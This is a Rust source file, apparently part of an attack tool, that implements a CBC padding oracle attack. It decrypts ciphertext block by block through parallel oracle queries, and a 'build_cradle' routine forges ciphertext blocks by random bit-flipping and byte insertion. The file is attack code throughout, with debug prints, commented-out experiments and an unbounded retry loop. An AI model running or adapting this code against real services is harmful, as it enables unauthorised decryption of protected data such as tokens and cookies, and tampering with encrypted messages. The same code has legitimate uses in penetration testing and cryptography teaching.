use std::sync::{
    Arc,
    atomic::{AtomicBool, Ordering},
};

use futures::future::join_all;
use rand::{Rng, random_range, seq::IteratorRandom};
use tokio::{select,task::{JoinHandle, JoinSet}, sync::{Mutex, mpsc::Sender}};
use tokio_util::sync::CancellationToken;

use crate::{
    crypt::{
        MessageForwarder, calc_intermediate_vector,
        detector::{DETECT, Detector, IntermediateDetector, SimpleDetector, calculate_byte, decrypt_intermediate_block},
    },
    errors::DecryptError,
    helper::{Config, Messages}, oracle::Oracle, print::fmt_bytes_custom,
};

#[derive(Clone)]
struct MakePrimeOptions {
    high_entropy: Option<bool>,
    fixed_blk_pos: Option<Vec<usize>>,
    valid_bytes: Option<Vec<(usize, Vec<u8>)>>
}
impl MakePrimeOptions {
    fn new() -> Self{
        return MakePrimeOptions { high_entropy: None, fixed_blk_pos: None, valid_bytes: None };
    }
}

async fn _make_prime(detector: &IntermediateDetector, ct: &[u8],ct_prefix: &[u8], ct_suffix:&[u8], retry: u16, options: Option<MakePrimeOptions>) -> Option<Vec<u8>>{
        let ct_prime = ct.to_vec();
        let success = Arc::new(AtomicBool::new(false));
        let options = options.unwrap_or(MakePrimeOptions::new());
        let mut futures_set = vec![];
        let valid_ct_prime = Arc::new(Mutex::new(ct.to_vec()));
        let cancelled = CancellationToken::new();
        for _ in 0..retry{
            // make small modification to ct_prime and check if valid
            let mut ct_prime = ct_prime.clone();
            let valid_ct_prime = valid_ct_prime.clone();
            let high_entropy = options.clone().high_entropy.unwrap_or(false);
            let fixed_blk_pos = options.clone().fixed_blk_pos.unwrap_or(vec![]);
            let byte_options = options.clone().valid_bytes.unwrap_or(vec![]);
            let success = success.clone();
            let cancelled = cancelled.clone();
            futures_set.push(async move{
                if byte_options.len() > 0{
                    for (pos, bytes) in byte_options.clone().into_iter().filter(|(p,_)| !fixed_blk_pos.contains(p)){
                        ct_prime[pos] = bytes.into_iter().choose(&mut rand::rng()).unwrap();
                    }
                }else{
                    let mut pos_array = (0..ct.len()).filter(|c| !fixed_blk_pos.contains(c)).collect::<Vec<usize>>();
                    if !high_entropy{
                        pos_array = vec![pos_array.into_iter().choose(&mut rand::rng()).unwrap()];
                    }
                    for pos in pos_array{
                        ct_prime[pos] = ct_prime[pos] ^ (1 << random_range(0..8));
                    }
                }
                let full_ct = [ct_prefix, ct_prime.as_slice(), ct_suffix].concat();
            
                if success.load(Ordering::SeqCst){
                    return;
                }
                if detector.check(&full_ct).await.is_ok_and(|d| d == DETECT::OUTLIER){
                    success.store(true, Ordering::SeqCst);
                    let mut prime = valid_ct_prime.lock().await;
                    *prime = ct_prime;
                    cancelled.cancel();
                    return;
                }
            });
        }
        select! {
            _ = join_all(futures_set) =>{},
            _ = cancelled.cancelled() =>{}
        }
        if success.load(Ordering::SeqCst){
            return Some(valid_ct_prime.lock().await.to_vec());
        }
        return None;
}

pub async fn build_cradle(detector: &IntermediateDetector, bad_chars: &[u8], cradle_block: &[u8], ct_prefix: &[u8], ct_suffix:&[u8], retry:u16) -> Option<(Vec<u8>, Vec<u8>)>{
    let blk_size = cradle_block.len();
    // Find [c1’] such that [c1][c1’][c2][c3][c4] is valid
    let c1 = ct_prefix[ct_prefix.len()-blk_size..].to_vec();
    let res = _make_prime(detector, &c1,ct_prefix, ct_suffix, retry,None).await;
    if res.is_none(){
        return None;
    }
    let mut c1_prime = res.unwrap();
    println!("check: {:?}", detector.check(&[ct_prefix, &c1_prime, ct_suffix].concat()).await);
    let mut fixed_pos = vec![];
    let mut byte_options = vec![];
    let valid_bytes = Arc::new(Mutex::new(vec![]));
    let mut c2_prime = vec![];
    while !c1_prime.eq(cradle_block){
        //Find second [c1’] such that [c1][c1’][c1’][c2][c3][c4] is valid
        let c2 = c1.clone();
        //c2[1] = 0xa0;
        let res = _make_prime(detector, &c2,&[ct_prefix, &c1_prime].concat(),ct_suffix, retry,None).await;
        println!("c2_prime: {:?}", res);
        if res.is_none(){
            return None;
        }
        c2_prime = res.unwrap();
        println!("Found Valid c2_prime!");
        let found_intermediate_block_bytes = Arc::new(Mutex::new(vec![]));
        let mut futures_set = vec![];
        // only decrypt bytes that need to be decrypted for insertion
        for pos in (0..blk_size).filter(|p| !fixed_pos.contains(p)){
            // copy everything for the async move
            let valid_bytes = valid_bytes.clone();
            let found_intermediate_block_bytes = found_intermediate_block_bytes.clone();
            let bad_chars = bad_chars.clone();
            let c2_prime = c2_prime.clone();
            let c1_prime = c1_prime.clone();
            futures_set.push(async move{
                if let Some((byte, found_valid_bytes)) = calculate_byte(detector, pos, &bad_chars, &c1_prime, &c2_prime, ct_prefix, ct_suffix).await{
                    let mut valid_bytes = valid_bytes.lock().await;
                    let valid_bytes_copy = valid_bytes.clone();
                    valid_bytes.append(&mut found_valid_bytes.into_iter().filter(|v| !valid_bytes_copy.contains(v)).collect::<Vec<u8>>());
                    println!("found intermediate block byte: {:2x?}", byte);
                    let intermediate_block_byte = byte ^ c1_prime[pos];
                    found_intermediate_block_bytes.lock().await.push((pos, intermediate_block_byte));
                }
            });
        }
        join_all(futures_set).await;
        let found_intermediate_block_bytes = found_intermediate_block_bytes.lock().await.to_vec();
        let valid_bytes = valid_bytes.lock().await.to_vec();
        for (pos, byte) in found_intermediate_block_bytes{
            // if inserting cradle block byte into c1_prime at pos would create a valid byte, then do it
            if valid_bytes.contains(&(byte ^ cradle_block[pos])){
                c1_prime[pos] = cradle_block[pos];
                fixed_pos.push(pos);
            }else{
                byte_options.push((pos, valid_bytes.iter().map(|v| *v ^ byte).collect::<Vec<u8>>()));
            }
        }
        // if we're not finished and we have some unfixed bytes in c1_prime, find a c1_prime that's valid
        if !c1_prime.eq(cradle_block){
            //leave a few unfixed positions so we have enough room to find a new c1_prime
            if blk_size - fixed_pos.len() < 2{
                let diff = blk_size - fixed_pos.len();
                fixed_pos = fixed_pos.clone()[..fixed_pos.len()-diff].to_vec();
            }
            if let Some(res) = _make_prime(detector, &c1_prime, ct_prefix, &[&c2_prime, ct_suffix].concat(), retry, Some(MakePrimeOptions { high_entropy: None, fixed_blk_pos: Some(fixed_pos.clone()), valid_bytes: Some(byte_options.clone()) })).await{
                c1_prime = res;
                println!("found new c1_prime: {:2x?}", c1_prime);
            }else{
                println!("could not find new valid c1_prime");
            }
        }
        println!("c1_prime: {:2x?}", c1_prime);
        println!("cradle__: {:2x?}", cradle_block);
    }

    //build a list of multiple c1_primes
    let res = _make_prime(detector, &c1,ct_prefix, ct_suffix, retry,None).await;
    if res.is_none(){
        return None;
    }
    let c1_prime_init = res.unwrap();

    let c2 = c1.clone();
    let res = _make_prime(detector, &c2,&[ct_prefix, &c1_prime_init].concat(),ct_suffix, retry,None).await;
    if res.is_none(){
        return None;
    }
    let c2_prime_init = res.unwrap();

    let canceled = CancellationToken::new();
    //let futures_set = vec![];
    let mut valid_prime;
    loop{
        if let Some(v) = _make_prime(detector, &c1_prime_init, ct_prefix, &[&c2_prime_init, ct_suffix].concat(), retry,Some(MakePrimeOptions{high_entropy:Some(true), fixed_blk_pos:None, valid_bytes:None})).await{
            valid_prime = v;
            if detector.check(&[ct_prefix, &valid_prime, &c1_prime, &c2_prime, ct_suffix].concat()).await.is_ok_and(|d| d == DETECT::OUTLIER){
                break;
            }
        }
    }
    // // get the intermediate block as-is
    // let (pt,valid_bytes) = decrypt_intermediate_block(detector, &bad_chars, &vec![0u8;blk_size], &c1_prime, &c2_prime, ct_prefix, &ct_suffix, blk_size).await;
    
    // for (i, b) in pt.iter().enumerate(){
    //     if !valid_bytes.contains(&(cradle_block[i] ^ *b)){
    //         println!("Would create invalid byte {} at: {}", cradle_block[i] ^ b, i);
    //         byte_options.push((i, valid_bytes.iter().map(|v| *v ^ *b).collect::<Vec<u8>>()));
    //     }else if (blk_size - fixed_pos.len()) > 1{ // leave enough unfixed positions that we can still find another c1_prime after setting the bytes
    //         fixed_pos.push(i);
    //         c1_prime[i] = cradle_block[i];
    //     }else{
    //         byte_options.push((i, valid_bytes.iter().map(|v| *v ^ *b).collect::<Vec<u8>>()));
    //         println!("here {}", fixed_pos.len());
    //     }
    // }
    // let c1_prime = _make_prime(detector, &c1_prime, ct_prefix, &[&c2_prime, ct_suffix].concat(), retry,Some(MakePrimeOptions { high_entropy: Some(true), fixed_blk_pos: Some(fixed_pos), valid_bytes: None })).await.unwrap();
    // println!("{}",fmt_bytes_custom(cradle_block));
    // println!("{}",fmt_bytes_custom(&c1_prime));
    // println!("{:?}",detector.check(&[ct_prefix, &c1_prime, &c2_prime, ct_suffix].concat()).await);
    return Some((valid_prime, c2_prime))
}

pub async fn padding_oracle_decrypt<O: Oracle>(
    ct: &[u8],
    oracle: O,
    tx: Sender<Messages>,
    config: Config,
) -> Result<Vec<u8>, DecryptError> {
    let blk_size = config.get_int("blk_size".to_owned(), 16) as usize;
    let threads = config.get_int("threads".to_owned(), 10) as usize;
    let retry = config.get_int("retry".to_owned(), 5) as u8;
    // classic padding oracle
    if let Ok(classic_detector) = SimpleDetector::init(ct, oracle, blk_size, threads).await {
        let _ = tx.send(Messages::OracleConfirmed).await;
        return _padding_decrypt(ct, classic_detector, retry, tx, blk_size).await;
    }
    let _ = tx.send(Messages::NoOracleFound).await;
    Err(DecryptError::CouldNotDecryptClassic(
        "No padding oracle found".into(),
    ))
}

async fn _padding_decrypt<D: Detector + 'static + Send + Sync>(
    ct: &[u8],
    detector: D,
    retry: u8,
    tx: Sender<Messages>,
    blk_size: usize,
) -> Result<Vec<u8>, DecryptError> {
    if ct.len() % blk_size != 0 || ct.len() <= 0 {
        return Err(DecryptError::CouldNotDecryptClassic(
            "Invalid ciphertext length".into(),
        ));
    }
    let blocks: Vec<Vec<u8>> = ct
        .chunks(blk_size.into())
        .map(|val| Vec::from(val))
        .collect();

    let detector_shared = Arc::new(detector);

    let plaintext_blocks_shared: Arc<Mutex<Vec<Vec<u8>>>> =
        Arc::new(Mutex::new(vec![vec![]; blocks.len() - 1]));
    let mut futures_set = Vec::new();
    let decrypt_error_shared = Arc::new(AtomicBool::new(false));
    // decrypt ct
    for block_index in 0..blocks.len() - 1 {
        let plaintext_blocks = plaintext_blocks_shared.clone();
        let detector = detector_shared.clone();
        let current_blocks = Vec::from(&blocks[block_index..block_index + 2]);

        // pass messages out to listeners
        let tx = tx.clone();

        let decrypt_error = decrypt_error_shared.clone();
        //get next two blocks
        let orig_first_block = current_blocks[0].clone();
        let orig_first_block_copy = orig_first_block.clone();

        let msg_forwarder = MessageForwarder::new(
            tx,
            Box::new(move |msg| match msg {
                Messages::ByteFound(zero_byte, pos) => {
                    let byte = zero_byte ^ orig_first_block_copy[pos];
                    return Messages::ByteFound(byte, block_index * blk_size + pos);
                }
                other => other,
            }),
        );

        futures_set.push(async move {
            let intermediate_vector = calc_intermediate_vector(
                current_blocks[1].clone(),
                detector,
                retry,
                msg_forwarder.local_tx.clone(),
            )
            .await;

            if intermediate_vector.is_err() {
                decrypt_error.fetch_or(true, Ordering::SeqCst);
                return;
            }
            let intermediate_vector = intermediate_vector.unwrap();

            let plaintext_block: Vec<u8> = orig_first_block
                .iter()
                .zip(intermediate_vector.iter())
                .map(|(x, y)| x ^ y)
                .collect();
            let mut plaintext_blocks_acquired = plaintext_blocks.lock().await;
            plaintext_blocks_acquired[block_index] = plaintext_block;
        });
    }
    join_all(futures_set).await;
    if decrypt_error_shared.load(Ordering::SeqCst) {
        return Err(DecryptError::CouldNotDecryptClassic(
            "Error: could not find intermediate block".to_string(),
        ));
    }
    let plaintext_blocks_acquired = plaintext_blocks_shared.lock().await;
    Ok(plaintext_blocks_acquired
        .iter()
        .flatten()
        .cloned()
        .collect())
}
